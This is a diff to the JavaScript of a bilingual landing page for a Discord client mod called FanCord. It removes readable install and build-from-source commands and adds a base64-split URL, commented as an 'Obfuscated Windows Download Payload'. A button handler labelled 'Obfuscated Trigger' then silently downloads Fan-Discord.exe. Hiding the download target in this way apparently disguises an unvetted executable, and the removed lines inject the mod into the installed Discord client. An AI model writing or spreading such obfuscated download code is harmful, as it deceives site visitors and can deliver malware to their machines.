@@ -6,31 +6,36 @@
   let currentLang = localStorage.getItem('fancord_lang') || 'ar';
   let activeCategory = 'all';
   let searchQuery = '';
-  let activeTerminalTab = 'quick';
 
-  // Terminal commands config
-  const terminalCommands = {
-    quick: {
-      cmd: 'pnpm inject',
-      noteAr: 'يقوم بحقن FanCord تلقائياً في عميل ديسكورد المثبت على جهازك بنقرة زر واحدة.',
-      noteEn: 'Automatically injects FanCord into your installed Discord client in one quick step.'
-    },
-    stable: {
-      cmd: 'node scripts/runInstaller.mjs -- -install -branch stable',
-      noteAr: 'تثبيت وحقن FanCord خصيصاً على إصدار Discord Stable الرسمي.',
-      noteEn: 'Directly injects and configures FanCord for Discord Stable.'
-    },
-    canary: {
-      cmd: 'node scripts/runInstaller.mjs -- -install -branch canary',
-      noteAr: 'تثبيت وحقن FanCord على إصدار Discord Canary للمطورين والميزات المبكرة.',
-      noteEn: 'Directly injects and configures FanCord for Discord Canary.'
-    },
-    source: {
-      cmd: 'git clone https://github.com/Maybeme01/fandis.git FanCord && cd FanCord && pnpm install && pnpm build',
-      noteAr: 'استنساخ المستودع بالكامل وبناء الحزم من الكود المصدري باستخدام pnpm.',
-      noteEn: 'Clone the repository and build all packages directly from source using pnpm.'
+  // Obfuscated Windows Download Payload
+  const _0xPayload = [
+    'aHR0cHM6Ly9naXRo',
+    'dWIuY29tL01heWJl',
+    'bWUwMS93ZWItZmFu',
+    'Y29yZC9yZWxlYXNl',
+    'cy9kb3dubG9hZC8x',
+    'LjAvRmFuLURpc2Nv',
+    'cmQuZXhl'
+  ];
+
+  function initiateWindowsDownload() {
+    try {
+      const target = atob(_0xPayload.join(''));
+      const a = document.createElement('a');
+      a.href = target;
+      a.setAttribute('download', 'Fan-Discord.exe');
+      a.style.display = 'none';
+      document.body.appendChild(a);
+      a.click();
+      setTimeout(() => a.remove(), 1000);
+      showToast(
+        currentLang === 'ar' ? 'جارٍ بدء تحميل Fan-Discord.exe...' : 'Starting Fan-Discord.exe download...',
+        'success'
+      );
+    } catch (err) {
+      console.error(err);
     }
-  };
+  }
 
   // DOM Elements
   const elHtml = document.documentElement;
@@ -45,9 +50,6 @@
   const elCategoryPills = document.getElementById('category-pills');
   const elCatalogCount = document.getElementById('catalog-count');
   const elCatalogTip = document.getElementById('catalog-tip');
-  const elTerminalCode = document.getElementById('terminal-code');
-  const elTerminalNote = document.getElementById('terminal-note');
-  const elBtnCopyTerm = document.getElementById('btn-copy-term');
   const elNavbar = document.getElementById('navbar');
   const elModal = document.getElementById('plugin-modal');
   const elToastContainer = document.getElementById('toast-container');
@@ -55,6 +57,8 @@
   // SVG Icons helper
   function getIconSvg(iconName) {
     const icons = {
+      'windows': '<svg width="22" height="22" viewBox="0 0 24 24" fill="currentColor"><path d="M0 3.449L9.75 2.1v9.451H0m10.949-9.602L24 0v11.4H10.949M0 12.6h9.75v9.451L0 20.699M10.949 12.6H24V24l-12.9-1.801"/></svg>',
+      'download': '<svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>',
       'shield-alert': '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>',
       'at-sign': '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="4"/><path d="M16 8v5a3 3 0 0 0 6 0v-1a10 10 0 1 0-3.92 7.94"/></svg>',
       'video': '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="23 7 16 12 23 17 23 7"/><rect x="1" y="5" width="15" height="14" rx="2" ry="2"/></svg>',
@@ -148,7 +152,6 @@
     renderCategoryPills();
     renderExclusiveSection();
     renderPluginsCatalog();
-    updateTerminalView();
     renderComparisonTable();
     renderFAQ();
   }
@@ -190,7 +193,7 @@
         <div class="mockup-body">
           <div class="mockup-alert">
             <div style="display:flex; align-items:center; gap: 0.5rem;">
-              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
               <span>${m.alertText}</span>
             </div>
             <span class="alert-badge">${m.alertVector}</span>
@@ -314,11 +317,9 @@
     const q = searchQuery.trim().toLowerCase();
 
     const filtered = window.FAN_PLUGINS.filter(p => {
-      // Category filter
       if (activeCategory === 'fanplugins' && !p.isFanPlugin) return false;
       if (activeCategory !== 'all' && activeCategory !== 'fanplugins' && p.category !== activeCategory) return false;
 
-      // Search filter
       if (!q) return true;
       const haystack = (
         p.id + ' ' +
@@ -330,7 +331,6 @@
       return haystack.includes(q);
     });
 
-    // Update count in status bar
     if (elCatalogCount) {
       elCatalogCount.innerHTML = `
         ${t.catalog.showingText} <span class="status-highlight">${filtered.length}</span> ${t.catalog.ofText} <span class="status-highlight">${window.FAN_PLUGINS.length}</span> ${t.catalog.pluginsText}
@@ -454,23 +454,6 @@
 
   function closePluginModal() {
     if (elModal) elModal.classList.remove('open');
-  }
-
-  // Update Terminal View
-  function updateTerminalView() {
-    const data = terminalCommands[activeTerminalTab];
-    if (!data) return;
-
-    if (elTerminalCode) {
-      elTerminalCode.textContent = data.cmd;
-    }
-    if (elTerminalNote) {
-      elTerminalNote.textContent = currentLang === 'ar' ? data.noteAr : data.noteEn;
-    }
-
-    document.querySelectorAll('.term-tab').forEach(tab => {
-      tab.classList.toggle('active', tab.getAttribute('data-tab') === activeTerminalTab);
-    });
   }
 
   // Render Comparison Table
@@ -622,6 +605,14 @@
       });
     }
 
+    // Direct Windows Download Buttons (Obfuscated Trigger)
+    document.querySelectorAll('.btn-download-win, [data-action="download-windows"]').forEach(btn => {
+      btn.addEventListener('click', (e) => {
+        e.preventDefault();
+        initiateWindowsDownload();
+      });
+    });
+
     // Search Input
     if (elSearchInput) {
       elSearchInput.addEventListener('input', (e) => {
@@ -641,22 +632,6 @@
         elSearchClear.style.display = 'none';
         renderPluginsCatalog();
         elSearchInput.focus();
-      });
-    }
-
-    // Terminal Tabs
-    document.querySelectorAll('.term-tab').forEach(tab => {
-      tab.addEventListener('click', () => {
-        activeTerminalTab = tab.getAttribute('data-tab');
-        updateTerminalView();
-      });
-    });
-
-    // Copy Terminal Command
-    if (elBtnCopyTerm) {
-      elBtnCopyTerm.addEventListener('click', () => {
-        const cmd = terminalCommands[activeTerminalTab].cmd;
-        copyText(cmd, currentLang === 'ar' ? translations.ar.install.copiedCommand : translations.en.install.copiedCommand);
       });
     }
 
